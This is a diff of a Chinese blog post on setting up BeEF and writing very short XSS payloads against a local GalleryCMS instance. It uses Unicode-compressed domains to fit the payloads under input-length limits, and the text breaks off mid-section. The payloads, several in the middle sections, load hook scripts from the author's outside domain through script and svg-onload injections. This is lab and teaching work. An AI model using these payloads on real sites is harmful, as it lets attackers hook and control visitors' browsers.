 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;source ~/.rvm/archives/rvm-1.26.11/scripts/rvm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-然后rvm命令就可以正常运行了
-
-2.安装ruby时报错没有足够空间：找到安装rvm的目录的/rvm/archives/rvm/scripts/functions/utility文件，
-
-搜索“df”行，您将找到此代码将：
-
-` __free_space=&#34;$( \command \df &#34;$1&#34; | __rvm_awk &#39;BEGIN{x=4} /Free/{x=3} $3==&#34;Avail&#34;{x=3} END{print $x}&#39; )&#34;`
-
-改为
-
-`__free_space=&#34;999999&#34;`
-
-同时为了防止checksum报错，需要加参数--verify downloads 2，这个参数不一定有用，建议采用第三条代替
-
-3.安装ruby时可能会非常非常~慢，需要先更改rvm源，其实就和你更改yum源为ali一样的道理
-
+&lt;p&gt;然后 rvm 命令就可以正常运行了&lt;/p&gt;
+&lt;p&gt;2. 安装 ruby 时报错没有足够空间：找到安装 rvm 的目录的 /rvm/archives/rvm/scripts/functions/utility 文件，&lt;/p&gt;
+&lt;p&gt;搜索 “df” 行，您将找到此代码将：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt; __free_space=&amp;quot;$( \command \df &amp;quot;$1&amp;quot; | __rvm_awk &#39;BEGIN&amp;#123;x=4&amp;#125; /Free/&amp;#123;x=3&amp;#125; $3==&amp;quot;Avail&amp;quot;&amp;#123;x=3&amp;#125; END&amp;#123;print $x&amp;#125;&#39; )&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;改为&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;__free_space=&amp;quot;999999&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;同时为了防止 checksum 报错，需要加参数–verify downloads 2，这个参数不一定有用，建议采用第三条代替&lt;/p&gt;
+&lt;p&gt;3. 安装 ruby 时可能会非常非常～慢，需要先更改 rvm 源，其实就和你更改 yum 源为 ali 一样的道理&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;ruby_url=https://cache.ruby-china.com/pub/ruby&amp;quot; &amp;gt; /usr/local/rvm/user/db&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;注意： 最后的路径要取决于你的安装路径，比如我的就在  ~/.rvm/user/db&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后就可以安装 rvm install 2.7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-4.提示
-
+&lt;p&gt;4. 提示&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ERROR:  SSL verification error at depth 0: ok (0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Error fetching https://ruby.taobao.org/:&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-更换gem源，参考链接[RubyGems 镜像 - Ruby China (ruby-china.com)](https://gems.ruby-china.com/)
-
-5.下载beef  [Kali Linux / Packages / beef-xss · GitLab](https://gitlab.com/kalilinux/packages/beef-xss)
-
-[GitHub - beefproject/beef: The Browser Exploitation Framework Project](https://github.com/beefproject/beef) 
-
-建议使用第二个
-
-注意：下载此版本ruby版本必须&gt;3.0.3
-
-6.报错`There was an error while trying to write to /www/wwwroot/www.radsm.co/beef/beef-xss/.bundle/config. It is likely that you need to grant write permissions for that path.`
-
-sudo给对应的文件夹递归加权限即可
-
-7.报错`in autodetect&#39;: Could not find a JavaScript runtime.`
-
-安装nodejs即可 `yum install nodejs`
-
-8.安装bundle install时非常慢，可以更新bundle源
-
+&lt;p&gt;更换 gem 源，参考链接&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nZW1zLnJ1YnktY2hpbmEuY29tLw==&#34;&gt; RubyGems 镜像 - Ruby China (ruby-china.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;5. 下载 beef  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRsYWIuY29tL2thbGlsaW51eC9wYWNrYWdlcy9iZWVmLXhzcw==&#34;&gt;Kali Linux / Packages / beef-xss · GitLab&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JlZWZwcm9qZWN0L2JlZWY=&#34;&gt;GitHub - beefproject/beef: The Browser Exploitation Framework Project&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;建议使用第二个&lt;/p&gt;
+&lt;p&gt;注意：下载此版本 ruby 版本必须 &amp;gt; 3.0.3&lt;/p&gt;
+&lt;p&gt;6. 报错 &lt;code&gt;There was an error while trying to write to /www/wwwroot/www.radsm.co/beef/beef-xss/.bundle/config. It is likely that you need to grant write permissions for that path.&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;sudo 给对应的文件夹递归加权限即可&lt;/p&gt;
+&lt;p&gt;7. 报错 &lt;code&gt;in autodetect&#39;: Could not find a JavaScript runtime.&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;安装 nodejs 即可  &lt;code&gt;yum install nodejs&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;8. 安装 bundle install 时非常慢，可以更新 bundle 源&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-9.显示`/home/lighthouse/.rvm/gems/ruby-3.0.3@beef/gems/activerecord-7.0.3.1/lib/active_record/connection_adapters/sqlite3_adapter.rb:349:in check_version&#39;: Your version of SQLite (3.7.17) is too old. Active Record supports SQLite &gt;= 3.8. (RuntimeError)`
-
-解决方法：
-
+&lt;p&gt;9. 显示 &lt;code&gt;/home/lighthouse/.rvm/gems/ruby-3.0.3@beef/gems/activerecord-7.0.3.1/lib/active_record/connection_adapters/sqlite3_adapter.rb:349:in check_version&#39;: Your version of SQLite (3.7.17) is too old. Active Record supports SQLite &amp;gt;= 3.8. (RuntimeError)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;解决方法：&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-devel-3.8.11-1.fc21.x86_64.rpm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ wget https://kojipkgs.fedoraproject.org//packages/sqlite/3.8.11/1.fc21/x86_64/sqlite-3.8.11-1.fc21.x86_64.rpm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ sudo yum install sqlite-3.8.11-1.fc21.x86_64.rpm sqlite-devel-3.8.11-1.fc21.x86_64.rpm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-10.报错
-
+&lt;p&gt;10. 报错&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[14:15:27][!] ERROR: Default username and password in use!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[14:15:27]    |_  Change the beef.credentials.passwd in config.yaml&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-解决方法：
-
+&lt;p&gt;解决方法：&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo vim config.yaml   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;更改默认密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-也可以参考一下这篇[RVM 安装 Ruby - 大数据从业者FelixZh - 博客园 (cnblogs.com)](https://www.cnblogs.com/felixzh/p/8081622.html)
-
-[安装rvm,升级ruby。跳的坑，做个记录 - 简书 (jianshu.com)](https://www.jianshu.com/p/12d3226d83ee)
-
-但我明显碰到了更多奇奇怪怪的问题
-
-总结：不要再centos上安装beef会变得不幸
-
-
-
-### 2.使用45,40，或者20个字符绕过xss长度限制
-
-下面使用gallerycms进行测试，原因是它采用jQuery框架，可以测试某些情况下的最短payload
-
-### 2.1gallerycms安装
-
-1.报错解决方法：
-
-![image-20220911001606531](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001606531.png)
-
-1.修改\application\config\database.php中的数据库密码，并且创建对应数据库
-
-2.切换php版本为5.X，因为该CMS使用旧版的CI框架
-
-
-
-2.随便注册，登录，此处的Album Name就是注入点
-
-![image-20220911001755992](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001755992.png)
-
-
-
-### 2.2使用短域名绕过字符限制
-
-短域名定义：通过Unicode编码使Unicode中一个字符被浏览器解析为两个或三个字符，最典型的有如下
-
+&lt;p&gt;也可以参考一下这篇&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmVsaXh6aC9wLzgwODE2MjIuaHRtbA==&#34;&gt; RVM 安装 Ruby - 大数据从业者 FelixZh - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xMmQzMjI2ZDgzZWU=&#34;&gt;安装 rvm, 升级 ruby。跳的坑，做个记录 - 简书 (jianshu.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;但我明显碰到了更多奇奇怪怪的问题&lt;/p&gt;
+&lt;p&gt;总结：不要再 centos 上安装 beef 会变得不幸&lt;/p&gt;
+&lt;h3 id=&#34;2使用4540或者20个字符绕过xss长度限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2使用4540或者20个字符绕过xss长度限制&#34;&gt;#&lt;/a&gt; 2. 使用 45,40，或者 20 个字符绕过 xss 长度限制&lt;/h3&gt;
+&lt;p&gt;下面使用 gallerycms 进行测试，原因是它采用 jQuery 框架，可以测试某些情况下的最短 payload&lt;/p&gt;
+&lt;h3 id=&#34;21gallerycms安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21gallerycms安装&#34;&gt;#&lt;/a&gt; 2.1gallerycms 安装&lt;/h3&gt;
+&lt;p&gt;1. 报错解决方法：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001606531.png&#34; alt=&#34;image-20220911001606531&#34;&gt;&lt;/p&gt;
+&lt;p&gt;1. 修改 \application\config\database.php 中的数据库密码，并且创建对应数据库&lt;/p&gt;
+&lt;p&gt;2. 切换 php 版本为 5.X，因为该 CMS 使用旧版的 CI 框架&lt;/p&gt;
+&lt;p&gt;2. 随便注册，登录，此处的 Album Name 就是注入点&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911001755992.png&#34; alt=&#34;image-20220911001755992&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;22使用短域名绕过字符限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22使用短域名绕过字符限制&#34;&gt;#&lt;/a&gt; 2.2 使用短域名绕过字符限制&lt;/h3&gt;
+&lt;p&gt;短域名定义：通过 Unicode 编码使 Unicode 中一个字符被浏览器解析为两个或三个字符，最典型的有如下&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ﬀ expands to `ff`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;℠ expands to `sm`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;㏛ expands to `sr`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ﬆ expands to `st`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;㎭ expands to `rad`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;℡ expands to `tel`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-因此我们就可以使用Unicode编码来缩短域名长度
-
-因此我注册了一个域名`radsm.co`,使用Unicode表示为`㎭℠.co`。相比之前减少了三个字符
-
-最极限的情况是使用`℡℠.㎺`,注意这里pw其实也是一个字符，我们可以只用四个字符构造一个域名，但我买的时候忘了pw。。。。
-
-https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
-
-https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html
-
-后来想起来不止这几个，其实极限域名甚至可以更短。。。
-
-
-
-##### 1.没有禁止script标签的情况
-
-使用xsshunt平台：
-
-`&lt;script/src=https://㎭℠.xss.ht&gt;`    
-
-此时该payload为30个字符
-
-使用beef-xss平台
-
-`&lt;script/src=http://㎭℠.co:3000/hook.js&gt;`
-
-此时该payload为30个字符
-
-但注意：src中不加&#34;&#34; 也可以正常解析，同时不加协议也可以正常解析
-
-
-
-对于xsshunter平台，由于使用的是他的子域名，无法在变短，但我们可以使用域名重定向，将我们自己的域名重定向到xsshunter的域名
-
-注意：国内的域名不支持重定向
-
-![image-20220911004504679](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004504679.png)
-
-
-
-
-
-对于beef-xss平台，由于hook.js这个路径太占长度，我们可以将hook.js写到index.html中，并且将网站使用默认端口省掉:3000这些字符
-
-![image-20220911004816278](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004816278.png)
-
-此时我们的极限payload为`&lt;script/src=//㎭℠.㎺&gt;`
-
-![image-20220911005113131](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911005113131.png)
-
-此时我们可以在19个长度内完成
-
-
-
-##### 2前端框架为jQuery，可以使用如下payload：
-
-不过滤script标签：
-
-注意此payload不能缺少&#34;&#34; ，同样需要把hook.js放到index.html中
-
+&lt;p&gt;因此我们就可以使用 Unicode 编码来缩短域名长度&lt;/p&gt;
+&lt;p&gt;因此我注册了一个域名 &lt;code&gt;radsm.co&lt;/code&gt; , 使用 Unicode 表示为 &lt;code&gt;㎭℠.co&lt;/code&gt; 。相比之前减少了三个字符&lt;/p&gt;
+&lt;p&gt;最极限的情况是使用 &lt;code&gt;℡℠.㎺&lt;/code&gt; , 注意这里 pw 其实也是一个字符，我们可以只用四个字符构造一个域名，但我买的时候忘了 pw。。。。&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZpbGVkZXNjcmlwdG9yL1VuaWNvZGUtTWFwcGluZy1vbi1Eb21haW4tbmFtZXM=&#34;&gt;https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qbGFqYXJhLmdpdGxhYi5pby93ZWIvMjAxOS8xMS8zMC9YU1NfMjBfY2hhcmFjdGVycy5odG1s&#34;&gt;https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;后来想起来不止这几个，其实极限域名甚至可以更短。。。&lt;/p&gt;
+&lt;h5 id=&#34;1没有禁止script标签的情况&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1没有禁止script标签的情况&#34;&gt;#&lt;/a&gt; 1. 没有禁止 script 标签的情况&lt;/h5&gt;
+&lt;p&gt;使用 xsshunt 平台：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;script/src=https://㎭℠.xss.ht&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;此时该 payload 为 30 个字符&lt;/p&gt;
+&lt;p&gt;使用 beef-xss 平台&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;script/src=http://㎭℠.co:3000/hook.js&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;此时该 payload 为 30 个字符&lt;/p&gt;
+&lt;p&gt;但注意：src 中不加 &amp;quot;&amp;quot; 也可以正常解析，同时不加协议也可以正常解析&lt;/p&gt;
+&lt;p&gt;对于 xsshunter 平台，由于使用的是他的子域名，无法在变短，但我们可以使用域名重定向，将我们自己的域名重定向到 xsshunter 的域名&lt;/p&gt;
+&lt;p&gt;注意：国内的域名不支持重定向&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004504679.png&#34; alt=&#34;image-20220911004504679&#34;&gt;&lt;/p&gt;
+&lt;p&gt;对于 beef-xss 平台，由于 hook.js 这个路径太占长度，我们可以将 hook.js 写到 index.html 中，并且将网站使用默认端口省掉：3000 这些字符&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911004816278.png&#34; alt=&#34;image-20220911004816278&#34;&gt;&lt;/p&gt;
+&lt;p&gt;此时我们的极限 payload 为 &lt;code&gt;&amp;lt;script/src=//㎭℠.㎺&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911005113131.png&#34; alt=&#34;image-20220911005113131&#34;&gt;&lt;/p&gt;
+&lt;p&gt;此时我们可以在 19 个长度内完成&lt;/p&gt;
+&lt;h5 id=&#34;2前端框架为jquery可以使用如下payload&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2前端框架为jquery可以使用如下payload&#34;&gt;#&lt;/a&gt; 2 前端框架为 jQuery，可以使用如下 payload：&lt;/h5&gt;
+&lt;p&gt;不过滤 script 标签：&lt;/p&gt;
+&lt;p&gt;注意此 payload 不能缺少 &amp;quot;&amp;quot; ，同样需要把 hook.js 放到 index.html 中&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;$.getScript(&amp;quot;//㎭℠.co&amp;quot;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-![image-20220911194433247](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911194433247.png)
-
-过滤script标签
-
-如果没有过滤svg标签。那么此时的payload为：
-
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911194433247.png&#34; alt=&#34;image-20220911194433247&#34;&gt;&lt;/p&gt;
+&lt;p&gt;过滤 script 标签&lt;/p&gt;
+&lt;p&gt;如果没有过滤 svg 标签。那么此时的 payload 为：&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg/onload=$.getScript(&amp;quot;//㎭℠.co&amp;quot;)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-![image-20220911195539757](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911195539757.png)
-
-
-
-
-
-##### 3.绕过GalleryCMS
-
-对于用户的输入，gallerycms做了严格的过滤，包括 从长度和内容限制
-
+&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911195539757.png&#34; alt=&#34;image-20220911195539757&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;3绕过gallerycms&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3绕过gallerycms&#34;&gt;#&lt;/a&gt; 3. 绕过 GalleryCMS&lt;/h5&gt;
+&lt;p&gt;对于用户的输入，gallerycms 做了严格的过滤，包括 从长度和内容限制&lt;/p&gt;
 &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;  &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Validate form.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;load-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;helper&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;form&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;load-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;library&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;form_validation&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;form_validation-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;set_error_delimiters&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;div class=&amp;quot;alert alert-error&amp;quot;&amp;gt;&amp;lt;strong&amp;gt;Error: &amp;lt;/strong&amp;gt;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;/div&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$user_data&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;session-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;all_userdata&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;form_validation-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;set_rules&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;album_name&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;Album Name&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;trim|required|max_length[45]|xss_clean&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-
-
-###### 假设没有xss_clean的绕过
-
-注意：我买的域名被腾讯与搞了，无法解析，因此只能用一些奇技淫巧了
-
-比如：我虚拟机的kali的ip是192.168.13.133，我的gallerycms部署在本机上，我在本机上host文件加一个dns解析，将radsm.co解析到192.168.13.133
-
-![image-20220911201545877](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220911201545877.png)
-
-但要是这样我tm白搭了一天的beef...
-
-这样我们的payload就会变长，我使用的端口为18888，访问时就会变成radsm.co:18888
-
-我们做一下减法payload会多出6个字符，到时候能解析的时候我们的payload就可以少六个
-
-
-
-1.payload长度限制为50时
-
+&lt;h6 id=&#34;假设没有xss_clean的绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#假设没有xss_clean的绕过&#34;&gt;#&lt;/a&gt; 假设没有 xss_clean 的绕过&lt;/h6&gt;
